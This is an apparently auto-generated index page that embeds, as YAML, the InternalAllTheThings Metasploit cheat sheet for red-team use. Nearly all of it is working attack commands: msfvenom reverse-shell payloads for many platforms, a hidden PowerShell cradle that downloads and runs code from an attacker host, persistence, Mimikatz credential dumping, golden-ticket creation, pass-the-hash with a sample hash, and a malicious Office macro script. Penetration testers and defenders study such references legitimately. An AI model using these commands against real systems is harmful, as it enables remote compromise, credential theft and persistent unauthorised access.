---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Metasploit

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-command-control-metasploit` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/command-control/metasploit.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Metasploit](../../topics/command-control/metasploit.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-command-control-metasploit |
| name | Metasploit |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/command-control/metasploit.md |

## Preserved Source Material

````yaml
_body: "# Metasploit\n\n## Summary\n\n* [Installation](#installation)\n* [Sessions](#sessions)\n* [Background handler](#background-handler)\n\
  * [Meterpreter - Basic](#meterpreter---basic)\n    * [Generate a meterpreter](#generate-a-meterpreter)\n    * [Meterpreter\
  \ Webdelivery](#meterpreter-webdelivery)\n    * [Get System](#get-system)\n    * [Persistence Startup](#persistence-startup)\n\
  \    * [Network Monitoring](#network-monitoring)\n    * [Portforward](#portforward)\n    * [Upload / Download](#upload--download)\n\
  \    * [Execute from Memory](#execute-from-memory)\n    * [Mimikatz](#mimikatz)\n    * [Pass the Hash - PSExec](#pass-the-hash---psexec)\n\
  \    * [Use SOCKS Proxy](#use-socks-proxy)\n* [Scripting Metasploit](#scripting-metasploit)\n* [Multiple transports](#multiple-transports)\n\
  * [Best of - Exploits](#best-of---exploits)\n* [References](#references)\n\n## Installation\n\n```powershell\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb\
  \ > msfinstall && chmod 755 msfinstall && ./msfinstall\n```\n\n## Sessions\n\n```powershell\nCTRL+Z   -> Session in Background\n\
  sessions -> List sessions\nsessions -i session_number -> Interact with Session with id\nsessions -u session_number -> Upgrade\
  \ session to a meterpreter\nsessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false->\
  \ Upgrade session to a meterpreter\n\nsessions -c cmd           -> Execute a command on several sessions\nsessions -i 10-20\
  \ -c \"id\" -> Execute a command on several sessions\n```\n\n## Background handler\n\nExitOnSession : the handler will not\
  \ exit if the meterpreter dies.\n\n```powershell\nscreen -dRR\nsudo msfconsole\n\nuse exploit/multi/handler\nset PAYLOAD\
  \ generic/shell_reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4444\nset ExitOnSession false\n\ngenerate -o /tmp/meterpreter.exe\
  \ -f exe\nto_handler\n\n[ctrl+a] + [d]\n```\n\n## Meterpreter - Basic\n\n### Generate a meterpreter\n\n```powershell\nmsfvenom\
  \ -p linux/x86/meterpreter/reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f elf > shell.elf\nmsfvenom -p windows/meterpreter/reverse_tcp\
  \ LHOST=\"10.10.10.110\" LPORT=4242 -f exe > shell.exe\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242\
  \ -f macho > shell.macho\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f raw > shell.php;\
  \ cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php\nmsfvenom -p windows/meterpreter/reverse_tcp\
  \ LHOST=\"10.10.10.110\" LPORT=4242 -f asp > shell.asp\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242\
  \ -f raw > shell.jsp\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f war > shell.war\nmsfvenom\
  \ -p cmd/unix/reverse_python LHOST=\"10.10.10.110\" LPORT=4242 -f raw > shell.py\nmsfvenom -p cmd/unix/reverse_bash LHOST=\"\
  10.10.10.110\" LPORT=4242 -f raw > shell.sh\nmsfvenom -p cmd/unix/reverse_perl LHOST=\"10.10.10.110\" LPORT=4242 -f raw\
  \ > shell.pl\n```\n\n### Meterpreter Webdelivery\n\nSet up a Powershell web delivery listening on port 8080.\n\n```powershell\n\
  use exploit/multi/script/web_delivery\nset TARGET 2\nset payload windows/x64/meterpreter/reverse_http\nset LHOST 10.0.0.1\n\
  set LPORT 4444\nrun\n```\n\n```powershell\npowershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX\
  \ $g.downloadstring('http://10.0.0.1:8080/rYDPPB');\n```\n\n### Get System\n\n```powershell\nmeterpreter > getsystem\n...got\
  \ system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\\
  SYSTEM\n```\n\n### Persistence Startup\n\n```powershell\nOPTIONS:\n\n-A        Automatically start a matching exploit/multi/handler\
  \ to connect to the agent\n-L <opt>  Location in target host to write payload to, if none %TEMP% will be used.\n-P <opt>\
  \  Payload to use, default is windows/meterpreter/reverse_tcp.\n-S        Automatically start the agent on boot as a service\
  \ (with SYSTEM privileges)\n-T <opt>  Alternate executable template to use\n-U        Automatically start the agent when\
  \ the User logs on\n-X        Automatically start the agent when the system boots\n-h        This help menu\n-i <opt>  The\
  \ interval in seconds between each connection attempt\n-p <opt>  The port on which the system running Metasploit is listening\n\
  -r <opt>  The IP of the system running Metasploit listening for the connect back\n\nmeterpreter > run persistence -U -p\
  \ 4242\n```\n\n### Network Monitoring\n\n```powershell\n# list interfaces\nrun packetrecorder -li\n\n# record interface\
  \ n°1\nrun packetrecorder -i 1\n```\n\n### Portforward\n\n```powershell\nportfwd add -l 7777 -r 172.17.0.2 -p 3006\n```\n\
  \n### Upload / Download\n\n```powershell\nupload /path/in/hdd/payload.exe exploit.exe\ndownload /path/in/victim\n```\n\n\
  ### Execute from Memory\n\n```powershell\nexecute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w\n```\n\n### Mimikatz\n\
  \n```powershell\nload mimikatz\nmimikatz_command -f version\nmimikatz_command -f samdump::hashes\nmimikatz_command -f sekurlsa::wdigest\n\
  mimikatz_command -f sekurlsa::searchPasswords\nmimikatz_command -f sekurlsa::logonPasswords full\n```\n\n```powershell\n\
  load kiwi\ncreds_all\ngolden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket>\
  \ -t <location_to_store_tck>\n```\n\n### Pass the Hash - PSExec\n\n```powershell\nmsf > use exploit/windows/smb/psexec\n\
  msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp\nmsf exploit(psexec) > exploit\nSMBDomain            \
  \ WORKGROUP                                                          no        The Windows domain to use for authentication\n\
  SMBPass               598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf  no        The password for the\
  \ specified username\nSMBUser               Lambda                                                             no      \
  \  The username to authenticate as\n```\n\n### Use SOCKS Proxy\n\n```powershell\nsetg Proxies socks4:127.0.0.1:1080\n```\n\
  \n## Scripting Metasploit\n\nUsing a `.rc file`, write the commands to execute, then run `msfconsole -r ./file.rc`.\nHere\
  \ is a simple example to script the deployment of a handler an create an Office doc with macro.\n\n```powershell\nuse exploit/multi/handler\n\
  set PAYLOAD windows/meterpreter/reverse_https\nset LHOST 0.0.0.0\nset LPORT 4646\nset ExitOnSession false\nexploit -j -z\n\
  \n\nuse exploit/multi/fileformat/office_word_macro \nset PAYLOAD windows/meterpreter/reverse_https\nset LHOST 10.10.14.22\n\
  set LPORT 4646\nexploit\n```\n\n## Multiple transports\n\n```powershell\nmsfvenom -p windows/meterpreter_reverse_tcp lhost=<host>\
  \ lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1\
  \ -f exe\n```\n\nThen, in AddTransports.ps1\n\n```powershell\nAdd-TcpTransport -lhost <host> -lport <port> -RetryWait 10\
  \ -RetryTotal 30\nAdd-WebTransport -Url http(s)://<host>:<port>/<luri> -RetryWait 10 -RetryTotal 30\n```\n\n## Best of -\
  \ Exploits\n\n* MS17-10 Eternal Blue - `exploit/windows/smb/ms17_010_eternalblue`\n* MS08_67 - `exploit/windows/smb/ms08_067_netapi`\n\
  \n## References\n\n* [Multiple transports in a meterpreter payload - ionize](https://ionize.com.au/multiple-transports-in-a-meterpreter-payload/)\n\
  * [Creating Metasploit Payloads - Peleus](https://netsec.ws/?p=331)"
_relative_path: command-control/metasploit.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/command-control/metasploit.md
````
